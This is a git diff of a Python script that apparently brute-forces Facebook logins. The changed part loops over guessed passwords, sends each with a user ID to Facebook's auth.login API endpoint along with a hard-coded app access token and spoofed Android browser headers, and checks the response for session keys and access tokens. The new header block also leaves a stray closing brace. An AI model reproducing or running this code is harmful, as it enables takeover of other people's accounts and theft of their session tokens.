@@ -403,7 +403,7 @@ logo = """
 \x1b[1;97m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞:  Saboo Noori
 \x1b[1;97m[+] 𝗚𝗜𝗧𝗛𝗨𝗕  :   Shabnam Noori  
 \x1b[1;97m[+] 𝗧𝗘𝗔𝗠    :   \33[1;42  Shabnam Noori  \33[0m
-\x1b[1;97m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 :\x1b[1;97m  1.0.0   \x1b[1;97m          
+\x1b[1;97m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 :\x1b[1;97m  1.0.1   \x1b[1;97m          
 \x1b[1;97m--------------------------------------
 """
  
@@ -873,15 +873,24 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
+			headers = {'authority': 'mbasic.facebook.com',
+  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'dpr': '2.625',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"SM-N950F"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"9.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent':pro}
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
